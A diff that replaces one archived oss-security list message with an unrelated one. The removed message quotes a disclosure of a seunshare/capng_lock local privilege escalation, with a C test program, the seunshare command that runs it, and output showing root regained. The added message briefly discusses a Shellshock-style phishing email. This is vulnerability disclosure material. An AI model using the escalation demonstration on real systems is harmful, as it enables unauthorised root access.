@@ -1,75 +1,20 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/04/29/8
-Message-ID: <5126435.Pcdt1RfNMA@x2>
-Date: Tue, 29 Apr 2014 17:49:04 -0400
-From: Steve Grubb <sgrubb@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/06/27
+Message-ID: <20141006175703.GI17130@blisses.org>
+Date: Mon, 6 Oct 2014 13:57:04 -0400
+From: Mason Loring Bliss <mason@...sses.org>
 To: oss-security@...ts.openwall.com
-Cc: Andy Lutomirski <luto@...capital.net>
-Subject: Re: local privilege escalation due to capng_lock as used in seunshare
+Subject: Re: automated phishing email
 Content-Type: text/plain; charset=utf-8
 
-On Tuesday, April 29, 2014 02:20:47 PM Andy Lutomirski wrote:
-> cap-ng's capng_lock function is insecure, seunshare uses it, and
-> seunshare is installed setuid root.
-> 
-> This results in a setuid program like this:
-> 
-> #include <sys/types.h>
-> #include <unistd.h>
-> #include <stdio.h>
-> #include <err.h>
-> 
-> int main()
-> {
->   if (setuid(getuid()) != 0)
->     err(1, "setuid(getuid())");
+On Tue, Oct 07, 2014 at 04:36:20AM +1100, Dave Horsfall wrote:
 
-If you do not want the saved uid to be available, you need to use setresuid. 
-That removes it. I would classify this as a bug in the test program.
+> Pardon me for being new here, but that looks suspiciously like a Shellshock
+> type of attack. Is Procmail also vulnerable to that sort of thing?
 
--Steve
+That's the question, and yes, Bash is clearly the target. What was initially
+confusing me was how they expected to access Bash from that.
 
->   printf("Dropped privs; real uid is %lu and effective uid is %lu\n",
->      (unsigned long)getuid(), (unsigned long)geteuid());
-> 
->   seteuid(0);
-> 
->   /* Do something that risks executing untrusted code here */
-> 
->   if (geteuid() == 0) {
->     printf("It's baaaack!\n");
->   } else {
->     printf("Phew, safe.\n");
->   }
-> 
->   return 0;
-> }
-> 
-> behaving like this:
-> 
-> $ ./sesploit
-> Dropped privs; real uid is 1000 and effective uid is 1000
-> Phew, safe.
-> 
-> This is okay until an attacker does:
-> 
-> $ seunshare -t . `realpath ./sesploit`
-> Dropped privs; real uid is 1000 and effective uid is 1000
-> It's baaaack!
-> 
-> newrole may have the same issue.
-> 
-> This was described recently here:
-> http://seclists.org/fulldisclosure/2014/Apr/262
-> 
-> and has been publicly disclosed in Red Hat's bugzilla for quite some time:
-> https://bugzilla.redhat.com/show_bug.cgi?id=1035427
-> https://bugzilla.redhat.com/show_bug.cgi?id=885288
-> 
-> I believe that there is at least one setuid program that can be used
-> as a vector and is widely installed.
-> 
-> There's a patch here:
-> 
-> https://bugzilla.redhat.com/attachment.cgi?id=829864
-
+-- 
+ Mason Loring Bliss         mason@...sses.org        http://blisses.org/  
+"I am a brother of jackals, and a companion of ostriches."  (Job 30 : 29)
